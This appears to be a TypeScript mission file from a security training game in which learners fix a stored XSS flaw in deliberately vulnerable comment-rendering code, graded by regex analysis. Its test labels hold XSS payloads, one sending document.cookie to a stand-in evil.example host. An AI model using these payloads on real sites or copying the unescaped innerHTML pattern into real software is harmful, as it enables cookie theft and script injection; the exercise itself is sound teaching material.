import type { MissionDef, Feedback, CodeTestResult } from '../../types';
import { normalize } from '../c1/mission';

/** C2 — Stored XSS in comment rendering. Code is analyzed, never executed. */

export const INITIAL = `// course/comments.js — shows student comments under a lesson
function renderComment(list, comment) {
  const item = document.createElement('li');
  item.innerHTML = '<strong>' + comment.author + '</strong>: ' + comment.text;
  list.appendChild(item);
}
`;

export function analyzeC2(code: string) {
  const n = normalize(code);
  const htmlSinkWithInput = /(innerHTML|outerHTML)\s*\+?=\s*[^;]*comment\.(author|text)/.test(n) || /insertAdjacentHTML\([^)]*comment\.(author|text)/.test(n) || /document\.write\([^)]*comment\./.test(n);
  const escFn = n.match(/function (\w*escape\w*)\s*\([^)]*\)\s*\{[^}]*\}/i);
  const escapes = !!escFn && /&amp;/.test(escFn[0]) && /&lt;/.test(escFn[0]) && /&gt;/.test(escFn[0]);
  const escapedBoth = !!escFn && new RegExp(`${escFn[1]}\\(\\s*comment\\.author\\s*\\)`).test(n) && new RegExp(`${escFn[1]}\\(\\s*comment\\.text\\s*\\)`).test(n);
  const safeText = (f: string) => new RegExp(`textContent\\s*=\\s*comment\\.${f}\\b|createTextNode\\([^)]*comment\\.${f}|textContent\\s*=\\s*[^;]*comment\\.${f}`).test(n);
  const textSafe = safeText('author') && safeText('text') && !htmlSinkWithInput;
  const escapeSafe = escapes && escapedBoth;
  return {
    hasFn: /function renderComment\s*\(\s*list\s*,\s*comment\s*\)/.test(n),
    appends: /list\.(appendChild|append)\(/.test(n),
    showsBoth: /comment\.author/.test(n) && /comment\.text/.test(n),
    vulnerable: htmlSinkWithInput && !escapeSafe,
    safe: textSafe || escapeSafe,
    partial: (safeText('author') !== safeText('text')) || (!!escFn && !escapedBoth),
  };
}

export function runC2(code: string): CodeTestResult[] {
  const a = analyzeC2(code);
  const works = a.hasFn && a.appends && a.showsBoth;
  const safe = a.safe && !a.vulnerable;
  const why = a.partial ? 'only one of the two fields is protected' : 'user input still reaches innerHTML as HTML';
  const p = (name: string): CodeTestResult => ({ name, pass: safe && works, detail: safe && works ? 'rendered as plain text — nothing executed' : !works ? 'fix the normal rendering first' : `payload executed (${why})` });
  return [
    { name: 'comment { author: "Mona", text: "Great lesson!" } is displayed', pass: works, detail: works ? 'list shows: Mona: Great lesson!' : !a.hasFn ? 'renderComment(list, comment) is missing or renamed' : 'the comment is no longer added to the list with author and text' },
    p('text: <script>stealCookies()</script>'),
    p('text: <img src=x onerror="fetch(\'//evil.example/?c=\'+document.cookie)">'),
    p('author: <b onmouseover=alert(1)>Admin</b>'),
  ];
}

export const missionC2: MissionDef = {
  id: 'c2', lab: 'coding', order: 2, baseXp: 350, hintCount: 3, parTime: 300,
  createSession() {
    let last: CodeTestResult[] | null = null;
    let feedback: Feedback | null = null;
    const status = () => last ? { xss: last.slice(1).every((r) => r.pass), works: last[0].pass } : { xss: false, works: false };
    return {
      code: {
        filename: 'course/comments.js', language: 'javascript', initial: INITIAL,
        test(code) {
          last = runC2(code);
          const a = analyzeC2(code); const st = status();
          feedback = st.xss && st.works ? null : a.partial ? { ok: false, key: 'fb.c2.partial' } : st.xss && !st.works ? { ok: false, key: 'fb.c2.broken' } : { ok: false, key: 'fb.c2.still' };
          return last;
        },
      },
      objectives: ['xss', 'works'], status, motd: '',
      takeFeedback: () => { const f = feedback; feedback = null; return f; },
    };
  },
};
